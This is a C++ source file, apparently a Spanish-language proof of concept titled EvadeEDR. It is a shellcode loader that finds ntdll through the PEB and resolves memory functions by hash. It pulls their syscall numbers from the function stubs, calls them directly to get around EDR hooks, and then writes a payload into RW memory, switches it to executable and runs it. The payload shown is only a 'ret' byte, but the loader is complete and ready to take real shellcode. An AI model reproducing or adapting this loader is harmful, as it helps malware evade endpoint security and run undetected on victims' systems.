// EvadeEDR.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>

#define PATH_DLL "C:\\Windows\\System32\\ntdll.dll"

#include "DefsModule.h"

extern "C" void __fastcall SetCall(WORD CallValue);

extern "C" NTSTATUS __fastcall CallFunc(...);


#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)

/* Un intento jaja */
typedef struct _FUNC_VAL
{
    ULONG magic_number;
    WORD call_number;
} FUNC_VAL, *PFUNC_VAL;


PTEB GetEnvironmentThreadBlock()
{
    return (PTEB)__readgsqword(0x30);
}


// Calculate the dbj2 to get function
unsigned int Calculacion(const char* str) {
    unsigned int hash = 5381;
    int c;

    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c; 
    }

    return hash;
}


// Buscar función por hash (en lugar de por nombre)
BOOL GetFunctionFrom(PVOID dllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PFUNC_VAL value) {
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)dllBase + pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR FunctionName = (PCHAR)((PBYTE)dllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)dllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
        
        if (Calculacion(FunctionName) == value->magic_number)
        {
            print("[+] Funcion encontrada: %s", FunctionName);

            /* Una vez obtenido la funcion obtenemos el syscall number */

            WORD cw = 0;
            while (TRUE) {
                // check if syscall, in this case we are too far
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                // check if ret, in this case we are also probaly too far
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    print("[-] No se obtuvo numero syscall");
                    return FALSE;
                }

                // First opcodes should be :
                //    MOV R10, RCX
                //    MOV RCX, <syscall>
                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    value->call_number = (high << 8) | low;
                    break;
                }

                cw++;
            }

            print("[+] El Syscall: %d", value->call_number);

            return TRUE;
        }
    }

    return FALSE;
}


// Gat the image 
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {


    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }


    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }


    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}


PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
{
    char* d = (char*) dest;
    const char* s = (const char*) src;
    if (d < s)
    {
        while (len--)
        {
            *d++ = *s++;
        }
    }
    else {
        const char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}



// Entry Point
int main()
{

    PTEB pCurrentTeb = GetEnvironmentThreadBlock();

    PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;

    if (!pCurrentTeb || !pCurrentPeb || pCurrentPeb->OSMajorVersion != 0xA)
    {
        print("[-] Error On getting TEB and PEB");
        return -1;
    }

    print("[+] Replicando chido");

    // Get Ntddl module 
    PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
    {
        print("[-] No se obtuvo Modulo de NTDLL");
        return -1;
    }

    print("[+] Se obtuvo modulo de NTDLL");


    //
    //  Functions to export
    //
    FUNC_VAL firstFunction = { 0 };
    FUNC_VAL secondFunction = { 0 };
    FUNC_VAL thirdFunction = { 0 };

    // NtAllocateVirtualMemory
    firstFunction.magic_number = 0x6793c34c;

    // NtProtectVirtualMemory
    secondFunction.magic_number = 0x82962c8;

    // NtFreeVirtualMemory
    thirdFunction.magic_number = 0x471aa7e9;
    
    // Get NtAllocateVirtualMemory
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &firstFunction);

    // Get NtProtectVirtualMemory
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &secondFunction);

    // Get NtFreeVirtualMemory
    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &thirdFunction);

    //
    //  Start process
    //

    // For the status
    NTSTATUS status = 0;

    // Payload
    BYTE payload[] = {
        0xC3  // ret
    };

    //
    //  Values for the memory allocation
    //
    PVOID pAddr = NULL;
    SIZE_T payload_size = sizeof(payload);
    SIZE_T real_size = payload_size;
    ULONG ulOldProtect = 0;

    //
    //  Start With the read write memory allocation
    //
    print("[*] Asignando memoria RW...");
    SetCall(firstFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, 0, &payload_size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
       
    if (status != 0)
    {
        print("[-] Error en NtAllocateVirtualMemory: 0x%08X", status);
        return -1;
    }

    if (!pAddr)
    {
        print("[-] No se obtuvo memoria");
    }

    print("[+] Memoria asignada en: 0x%p", pAddr);
    print("[+] Size: %zu bytes", payload_size);


    //
    //  Read Write Memory
    //
    print("[*] Copiando payload...");
    CopyMem( pAddr, (PVOID) payload, real_size);
    print("[+] Payload copiado");


    //
    //  Changing permissions from the memory region
    //
    print("[*] Cambiando permisos a RX...");
    SetCall(secondFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, &payload_size, PAGE_EXECUTE_READ, &ulOldProtect);
   
    if (status != 0)
    {
        print("[-] Error cambiando permisos: 0x%08X", status);
        return -1;
    }

    print("[+] Permisos cambiados exitosamente");

    print("[*] Ejecutando payload...");
    ((void(*)())pAddr)();
    print("[+] Payload ejecutado");

    //
    // Free memory
    //

    SIZE_T free_size = 0;

    print("[*] Liberando memoria...");
    SetCall(thirdFunction.call_number);
    status = CallFunc((HANDLE)-1, &pAddr, &free_size, MEM_RELEASE);

    if (status != 0)
    {
        print("[-] Error en NtFreeVirtualMemory: 0x%08X", status);
        return -1;
    }

    print("[+] Memoria liberada %lld", free_size);
    print("[+] Programa finalizado correctamente");
}
